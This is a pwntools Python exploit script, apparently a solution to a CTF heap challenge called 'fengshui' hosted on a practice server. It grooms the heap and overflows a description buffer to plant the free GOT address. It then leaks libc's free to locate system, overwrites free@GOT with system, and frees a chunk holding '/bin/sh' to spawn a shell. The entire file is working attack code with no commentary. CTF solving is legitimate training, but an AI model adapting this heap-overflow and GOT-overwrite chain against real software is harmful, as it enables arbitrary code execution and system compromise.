#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./fengshui")
p = remote("ctf.j0n9hyun.xyz", 3028)
#gdb.attach(p)
elf = ELF("./fengshui")
libc = ELF("./libc.so.6")
binsh = "/bin/sh"
free_got = elf.got['free']

def add(size, name, length, desc):
    p.sendlineafter("Choice: ", '0')
    p.sendlineafter("Size of description: ", str(size))
    p.sendlineafter("Name: ", name)
    p.sendlineafter("Text length: ", str(length))
    p.sendafter("Text: ", desc)

def delete(index):
    p.sendlineafter("Choice: ", '1')
    p.sendlineafter("Index:" , str(index))

def display(index):
    p.sendlineafter("Choice: ", '2')
    p.sendlineafter("Index: ", str(index))

def update(index, length, desc):
    p.sendlineafter("Choice: ", '3')
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Text length: ", str(length))
    p.sendafter("Text: ", desc)

add(10, 'A'*10, 10, 'B'*10)
add(10, 'A'*10, 10, 'B'*10)
add(10, 'A'*10, len(binsh), binsh)

delete(0)

pay = 'A'*(120+0x10+0x10) + p32(free_got)
add(120, 'A'*120, len(str(pay)), pay)

#gdb.attach(p)
# libc leak
display(1)
p.recvuntil("Description: ")
free = u32(p.recv(4))
log.info("free : "+hex(free))
libcBase = free - libc.symbols['free']
system = libcBase + libc.symbols['system']

# GOT overwrite
update(1, 4, p32(system))

delete(2)
p.interactive()
